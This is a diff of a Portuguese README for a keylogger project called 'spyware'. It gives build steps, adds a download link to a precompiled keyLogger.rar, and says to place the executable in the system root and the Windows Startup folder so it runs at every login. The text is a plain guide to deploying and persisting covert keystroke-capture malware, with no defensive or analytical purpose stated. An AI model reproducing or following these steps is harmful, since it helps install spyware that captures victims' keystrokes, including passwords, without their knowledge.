@@ -16,7 +16,7 @@
 ```
 python setup.py build
 ```
-* Este comando vai compilar o projeto, gerando um projeto com um .exe;
+* Este comando vai compilar o projeto, gerando um projeto com um .exe (Ou apenas baixe o projeto compilado <a href="https://github.com/DarlanNoetzold/spyware/raw/main/spyware/keyLogger.rar">aqui</a>);
 * Copie a pasta com o .exe e cole em um diretório chamado keyLogger;
 * Esta pasta deve ser colocada no diretório raiz do seu SO;
 * Após isso basta ir para o diretório C:\Users\\<Seu Usuário>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup;
